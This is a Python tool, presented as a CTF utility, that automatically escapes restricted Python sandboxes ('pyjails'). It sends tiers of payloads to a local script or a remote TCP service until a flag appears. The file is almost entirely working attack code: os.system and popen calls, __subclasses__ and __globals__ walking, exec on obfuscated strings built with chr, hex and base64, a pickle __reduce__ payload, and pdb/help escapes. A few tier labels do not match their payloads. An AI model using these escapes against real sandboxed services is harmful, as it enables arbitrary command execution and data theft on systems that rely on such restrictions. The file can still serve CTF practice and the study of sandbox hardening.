#!/usr/bin/env python3
"""auto_pyjail -- Python jail/sandbox escape tool for CTF challenges.

Enumerates available builtins and modules, then escalates through a cascade
of increasingly sophisticated bypass payloads to escape restricted Python
environments and capture flags.

Techniques:
  - __builtins__ recovery via __import__
  - __subclasses__() traversal (os._wrap_close, subprocess.Popen, etc.)
  - __globals__ / __code__ attribute walking
  - Unicode/encoding tricks to bypass character filters
  - Pickle deserialization payloads
  - eval/exec with dynamically constructed strings
  - Attribute access via getattr / __getattribute__
  - Exception-based info leaks

Usage:
    python3 auto_pyjail.py --target HOST:PORT [--flag-format "flag{"]
    python3 auto_pyjail.py --script ./jail.py [--flag-format "flag{"]
    python3 auto_pyjail.py --script ./jail.py --filter "import,os,system"

Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import os
import re
import socket
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# Flag scanning
# ---------------------------------------------------------------------------
DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")


def _scan_flags(text: str, flag_format: str = "") -> list[str]:
    """Return all flag-like strings found in *text*."""
    flags: list[str] = []
    if flag_format:
        prefix = flag_format.rstrip("{")
        try:
            pat = re.compile(re.escape(prefix) + r"\{[^}]{3,}\}")
            flags.extend(m.group(0) for m in pat.finditer(text))
        except re.error:
            pass
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    # Deduplicate while preserving order
    seen: set[str] = set()
    unique: list[str] = []
    for f in flags:
        if f not in seen:
            seen.add(f)
            unique.append(f)
    return unique


# ---------------------------------------------------------------------------
# Transport layer -- local script or remote socket
# ---------------------------------------------------------------------------

class LocalTransport:
    """Interact with a local Python jail script."""

    def __init__(self, script_path: str):
        self.script_path = os.path.abspath(script_path)
        if not os.path.isfile(self.script_path):
            print(f"[-] Script not found: {self.script_path}")
            sys.exit(1)

    def send_payload(self, payload: str, timeout: float = 10.0) -> str:
        """Run the jail script, pipe the payload to stdin, return output."""
        try:
            proc = subprocess.run(
                [sys.executable, self.script_path],
                input=payload + "\n",
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return proc.stdout + proc.stderr
        except subprocess.TimeoutExpired:
            return "[timeout]"
        except Exception as exc:
            return f"[error: {exc}]"


class RemoteTransport:
    """Interact with a remote Python jail via TCP."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port

    def send_payload(self, payload: str, timeout: float = 10.0) -> str:
        """Connect, wait for prompt, send payload, collect response."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.host, self.port))
            # Read banner / prompt
            banner = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    banner += chunk
                    # Heuristic: if we see a prompt indicator, stop reading
                    if b">>>" in banner or b">" in banner[-3:] or b":" in banner[-3:]:
                        break
            except socket.timeout:
                pass
            # Send payload
            sock.sendall((payload + "\n").encode())
            time.sleep(0.5)
            # Read response
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            sock.close()
            full = banner + response
            return full.decode("utf-8", errors="replace")
        except Exception as exc:
            return f"[error: {exc}]"


# ---------------------------------------------------------------------------
# Payload generation -- cascading from simple to complex
# ---------------------------------------------------------------------------

def _build_payloads(blocked: list[str] | None = None) -> list[tuple[str, str]]:
    """Return a list of (description, payload) tuples, ordered simple → complex.

    If *blocked* is given, payloads containing any blocked keyword/char are
    skipped.
    """
    blocked = blocked or []

    payloads: list[tuple[str, str]] = []

    # ------------------------------------------------------------------
    # Tier 0: Direct commands (least restricted jails)
    # ------------------------------------------------------------------
    payloads.append((
        "direct import os + system",
        "import os; os.system('cat flag* /flag* 2>/dev/null || ls')",
    ))
    payloads.append((
        "direct __import__",
        "__import__('os').system('cat flag* /flag* 2>/dev/null || ls')",
    ))
    payloads.append((
        "direct open() read",
        "print(open('flag.txt').read())",
    ))
    payloads.append((
        "glob + open for flag files",
        "import glob; [print(open(f).read()) for f in glob.glob('flag*')]",
    ))
    payloads.append((
        "subprocess.check_output",
        "import subprocess; print(subprocess.check_output('cat flag*', shell=True).decode())",
    ))

    # ------------------------------------------------------------------
    # Tier 1: __builtins__ recovery
    # ------------------------------------------------------------------
    payloads.append((
        "builtins via __builtins__.__import__",
        "__builtins__.__import__('os').system('cat flag* /flag* 2>/dev/null')",
    ))
    payloads.append((
        "builtins dict getitem __import__",
        "__builtins__.__dict__['__import__']('os').system('cat flag* /flag* 2>/dev/null')",
    ))
    payloads.append((
        "builtins via globals",
        "globals()['__builtins__'].__import__('os').system('cat flag* /flag*')",
    ))
    payloads.append((
        "getattr on builtins module",
        "getattr(__builtins__, '__import__')('os').system('cat flag* /flag*')",
    ))

    # ------------------------------------------------------------------
    # Tier 2: __subclasses__() traversal
    # ------------------------------------------------------------------
    # os._wrap_close → popen
    payloads.append((
        "subclasses: find os._wrap_close for popen",
        "[c for c in ().__class__.__bases__[0].__subclasses__() "
        "if c.__name__=='_wrap_close'][0].__init__.__globals__['system']('cat flag* /flag*')",
    ))
    # Generic: iterate subclasses for 'os' in globals
    payloads.append((
        "subclasses: iterate for os module in globals",
        "next(c.__init__.__globals__['system']('cat flag* /flag*') "
        "for c in ().__class__.__bases__[0].__subclasses__() "
        "if 'system' in getattr(getattr(c,'__init__',None),'__globals__',{}))",
    ))
    # subprocess.Popen via subclasses
    payloads.append((
        "subclasses: Popen via class search",
        "[c for c in ().__class__.__bases__[0].__subclasses__() "
        "if 'Popen' in c.__name__][0](['cat','flag.txt'],stdout=-1).communicate()[0]",
    ))
    # Catch-all: find any class whose __init__.__globals__ has __builtins__
    payloads.append((
        "subclasses: recover __builtins__ from any class",
        "[c.__init__.__globals__['__builtins__']['__import__']('os').system('cat flag* /flag*') "
        "for c in ().__class__.__bases__[0].__subclasses__() "
        "if '__builtins__' in getattr(getattr(c,'__init__',None),'__globals__',{})][0]",
    ))
    # Using __mro__ instead of __bases__
    payloads.append((
        "subclasses via __mro__",
        "[c for c in ''.__class__.__mro__[1].__subclasses__() "
        "if c.__name__=='_wrap_close'][0].__init__.__globals__['system']('cat flag* /flag*')",
    ))

    # ------------------------------------------------------------------
    # Tier 3: String construction to evade keyword filters
    # ------------------------------------------------------------------
    payloads.append((
        "chr() concat to build 'os' import",
        "exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)"
        "+chr(111)+chr(115)+chr(59)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)"
        "+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)"
        "+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(42)+chr(39)+chr(41))",
    ))
    payloads.append((
        "string reverse to build import",
        "exec('*galf tac(metsys.so ;so tropmi'[::-1])",
    ))
    payloads.append((
        "bytes.fromhex for import os",
        "exec(bytes.fromhex('696d706f7274206f733b6f732e73797374656d2827636174"
        "20666c61672a2027292020').decode())",
    ))
    payloads.append((
        "base64 decode import",
        "exec(__import__('base64').b64decode(b'aW1wb3J0IG9zO29zLnN5c3RlbSgnY2F0IGZsYWcqJyk=').decode())",
    ))
    payloads.append((
        "join + map + chr to build payload",
        "exec(''.join(map(chr,[105,109,112,111,114,116,32,111,115,59,111,115,46,"
        "115,121,115,116,101,109,40,39,99,97,116,32,102,108,97,103,42,39,41])))",
    ))

    # ------------------------------------------------------------------
    # Tier 4: Attribute access via getattr chains
    # ------------------------------------------------------------------
    payloads.append((
        "getattr chain from empty string",
        "getattr(getattr(getattr('',"
        "'__class__'),'__mro__')[1],'__subclasses__')()",
    ))
    payloads.append((
        "getattr to reach os from object subclasses",
        "(lambda sc=[c for c in getattr(getattr('',"
        "'__class__'),'__mro__')[1].__subclasses__() "
        "if 'wrap_close' in c.__name__]: "
        "getattr(sc[0].__init__,'__globals__')['system']('cat flag* /flag*'))()",
    ))

    # ------------------------------------------------------------------
    # Tier 5: Unicode homoglyph tricks
    # ------------------------------------------------------------------
    payloads.append((
        "unicode identifier trick (fullwidth chars)",
        # Python 3 accepts certain Unicode as valid identifiers
        "eval('__imp\\u006frt__(\"\\u006fs\").system(\"cat flag*\")')",
    ))

    # ------------------------------------------------------------------
    # Tier 6: Pickle deserialization
    # ------------------------------------------------------------------
    payloads.append((
        "pickle RCE via __reduce__",
        "import pickle,base64; "
        "print(pickle.loads(base64.b64decode("
        "b'gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBVjYXQgZmxhZyogL2ZsYWcqIDI+LzGUhZRSlC4=')))",
    ))

    # ------------------------------------------------------------------
    # Tier 7: Code object manipulation
    # ------------------------------------------------------------------
    payloads.append((
        "eval with compile + code objects",
        "eval(compile('import os;os.system(\"cat flag* /flag*\")','','exec'))",
    ))
    payloads.append((
        "type() to create function with code",
        "(lambda: None).__class__.__bases__[0].__subclasses__()",
    ))

    # ------------------------------------------------------------------
    # Tier 8: breakpoint / help / license tricks
    # ------------------------------------------------------------------
    payloads.append((
        "breakpoint() to drop to pdb",
        "breakpoint()",
    ))
    payloads.append((
        "help() interactive escape",
        "help()",
    ))
    payloads.append((
        "license() interactive pager escape",
        "license()",
    ))

    # ------------------------------------------------------------------
    # Tier 9: Exception-based info leak
    # ------------------------------------------------------------------
    payloads.append((
        "exception __traceback__ frame globals",
        "try:\n 1/0\nexcept Exception as e:\n "
        "import sys;f=sys.exc_info()[2].tb_frame;"
        "print(f.f_globals.get('flag',f.f_builtins['__import__']('os').popen('cat flag*').read()))",
    ))

    # ------------------------------------------------------------------
    # Tier 10: audit hook bypass / sys tricks
    # ------------------------------------------------------------------
    payloads.append((
        "sys._getframe globals",
        "import sys; print(sys._getframe().f_globals)",
    ))
    payloads.append((
        "dir() + locals() enumeration",
        "print(dir()); print(locals()); print(globals())",
    ))

    # ------------------------------------------------------------------
    # Tier 11: Nested eval to bypass single-level filters
    # ------------------------------------------------------------------
    payloads.append((
        "double eval to rebuild string",
        "eval(eval('\"__imp\"+\"ort__\"'))(eval('\"o\"+\"s\"')).system('cat flag*')",
    ))

    # ------------------------------------------------------------------
    # Tier 12: f-string / format_map tricks
    # ------------------------------------------------------------------
    payloads.append((
        "format_map with globals",
        "'{0.__class__.__mro__[1].__subclasses__}'.format_map({0: ''})",
    ))

    # ------------------------------------------------------------------
    # Tier 13: os.popen variant
    # ------------------------------------------------------------------
    payloads.append((
        "os.popen read",
        "__import__('os').popen('cat flag* /flag* 2>/dev/null').read()",
    ))
    payloads.append((
        "os.listdir + open",
        "[print(open(f).read()) for f in __import__('os').listdir('.') if 'flag' in f]",
    ))

    # ------------------------------------------------------------------
    # Filter: remove payloads containing blocked keywords / chars
    # ------------------------------------------------------------------
    if blocked:
        filtered: list[tuple[str, str]] = []
        for desc, payload in payloads:
            skip = False
            for b in blocked:
                if b in payload:
                    skip = True
                    break
            if not skip:
                filtered.append((desc, payload))
        return filtered

    return payloads


# ---------------------------------------------------------------------------
# Enumeration payloads -- run first to learn about the environment
# ---------------------------------------------------------------------------

ENUM_PAYLOADS: list[tuple[str, str]] = [
    ("list dir()", "print(dir())"),
    ("list builtins", "print(dir(__builtins__))"),
    ("type of __builtins__", "print(type(__builtins__))"),
    ("globals keys", "print(list(globals().keys()))"),
    ("sys.modules", "import sys; print(list(sys.modules.keys()))"),
    ("subclasses count", "print(len(().__class__.__bases__[0].__subclasses__()))"),
    ("subclasses list", "print([c.__name__ for c in ().__class__.__bases__[0].__subclasses__()])"),
    ("find _wrap_close index",
     "print([i for i,c in enumerate(().__class__.__bases__[0].__subclasses__()) "
     "if 'wrap_close' in c.__name__])"),
    ("find Popen index",
     "print([i for i,c in enumerate(().__class__.__bases__[0].__subclasses__()) "
     "if 'Popen' in c.__name__])"),
    ("find os in any subclass globals",
     "print([c.__name__ for c in ().__class__.__bases__[0].__subclasses__() "
     "if 'system' in getattr(getattr(c,'__init__',None),'__globals__',{})])"),
    ("cwd + ls", "import os; print(os.getcwd(), os.listdir('.'))"),
    ("read flag.txt", "print(open('flag.txt').read())"),
    ("read flag", "print(open('flag').read())"),
]


# ---------------------------------------------------------------------------
# Main solver loop
# ---------------------------------------------------------------------------

def solve(transport, flag_format: str, blocked: list[str] | None, verbose: bool):
    """Run enumeration then escalating payloads until a flag is found."""

    all_output: list[str] = []
    found_flags: list[str] = []

    def _try(desc: str, payload: str) -> str:
        if verbose:
            print(f"\n[*] Trying: {desc}")
            print(f"    Payload: {payload[:120]}{'...' if len(payload)>120 else ''}")
        result = transport.send_payload(payload)
        if verbose:
            preview = result[:500]
            print(f"    Result:  {preview}{'...' if len(result)>500 else ''}")
        return result

    # Phase 1: Enumeration
    print("[+] Phase 1: Enumerating jail environment...")
    for desc, payload in ENUM_PAYLOADS:
        result = _try(desc, payload)
        all_output.append(result)
        flags = _scan_flags(result, flag_format)
        if flags:
            for f in flags:
                print(f"\n[+] EXTRACTED FLAG: {f}")
                found_flags.append(f)
            # Don't stop -- keep enumerating for more info, but record early flag
        # Check for explicit error messages to learn about filters
        if "blocked" in result.lower() or "forbidden" in result.lower():
            if verbose:
                print(f"    [!] Detected filter response")

    if found_flags:
        print(f"\n[+] Flag(s) found during enumeration!")
        for f in found_flags:
            print(f"EXTRACTED FLAG: {f}")
        return found_flags

    # Phase 2: Escalating payloads
    print("\n[+] Phase 2: Escalating bypass payloads...")
    payloads = _build_payloads(blocked)
    print(f"[*] {len(payloads)} payloads to try (after filter exclusion)")

    for desc, payload in payloads:
        result = _try(desc, payload)
        all_output.append(result)

        # Check for flags
        flags = _scan_flags(result, flag_format)
        if flags:
            for f in flags:
                print(f"\n[+] EXTRACTED FLAG: {f}")
                print(f"[+] Working payload ({desc}):")
                print(f"    {payload}")
                found_flags.append(f)
            return found_flags

        # If we see file listings or interesting output, try to use it
        if "flag" in result.lower() and "error" not in result.lower():
            # Might have listed files; try to read them
            for candidate in re.findall(r"flag\S*", result):
                candidate = candidate.strip("',[]\"")
                if candidate and not candidate.startswith("flag{"):
                    read_result = _try(
                        f"read discovered file: {candidate}",
                        f"print(open('{candidate}').read())",
                    )
                    rflags = _scan_flags(read_result, flag_format)
                    if rflags:
                        for f in rflags:
                            print(f"\n[+] EXTRACTED FLAG: {f}")
                            found_flags.append(f)
                        return found_flags

    # Phase 3: Dynamic subclass index payloads
    print("\n[+] Phase 3: Dynamic subclass index probing...")
    for idx in range(130, 160):
        payload = (
            f"print(().__class__.__bases__[0].__subclasses__()[{idx}]"
            f".__init__.__globals__['system']('cat flag* /flag* 2>/dev/null'))"
        )
        result = _try(f"subclass index {idx} → system()", payload)
        flags = _scan_flags(result, flag_format)
        if flags:
            for f in flags:
                print(f"\n[+] EXTRACTED FLAG: {f}")
                print(f"[+] Working subclass index: {idx}")
                found_flags.append(f)
            return found_flags

    if not found_flags:
        print("\n[-] No flag found. Dumping collected output for manual analysis:")
        for i, out in enumerate(all_output):
            if out.strip() and out.strip() not in ("[timeout]", "[error]"):
                print(f"--- Output {i} ---")
                print(out[:1000])

    return found_flags


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Python jail/sandbox escape tool for CTF challenges.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 auto_pyjail.py --script jail.py\n"
            "  python3 auto_pyjail.py --target 10.0.0.1:1337 --flag-format 'flag{'\n"
            "  python3 auto_pyjail.py --script jail.py --filter 'import,os,system,open'\n"
        ),
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--target",
        metavar="HOST:PORT",
        help="Remote jail endpoint (e.g. 10.0.0.1:1337)",
    )
    group.add_argument(
        "--script",
        metavar="PATH",
        help="Path to local Python jail script",
    )
    parser.add_argument(
        "--flag-format",
        default="",
        help="Expected flag prefix, e.g. 'flag{' or 'CTF{' (default: auto-detect)",
    )
    parser.add_argument(
        "--filter",
        default="",
        help="Comma-separated list of blocked keywords/characters to avoid in payloads",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Print each payload and its response",
    )

    args = parser.parse_args()

    # Build transport
    if args.target:
        try:
            host, port_str = args.target.rsplit(":", 1)
            port = int(port_str)
        except ValueError:
            print("[-] Invalid --target format. Use HOST:PORT")
            sys.exit(1)
        transport = RemoteTransport(host, port)
        print(f"[+] Target: {host}:{port} (remote)")
    else:
        transport = LocalTransport(args.script)
        print(f"[+] Target: {args.script} (local)")

    blocked = [b.strip() for b in args.filter.split(",") if b.strip()] if args.filter else None
    if blocked:
        print(f"[*] Blocked keywords/chars: {blocked}")

    flags = solve(transport, args.flag_format, blocked, args.verbose)

    if flags:
        print(f"\n[+] SUCCESS -- {len(flags)} flag(s) extracted")
        for f in flags:
            print(f"EXTRACTED FLAG: {f}")
        sys.exit(0)
    else:
        print("\n[-] FAILED -- no flag extracted")
        sys.exit(1)


if __name__ == "__main__":
    main()
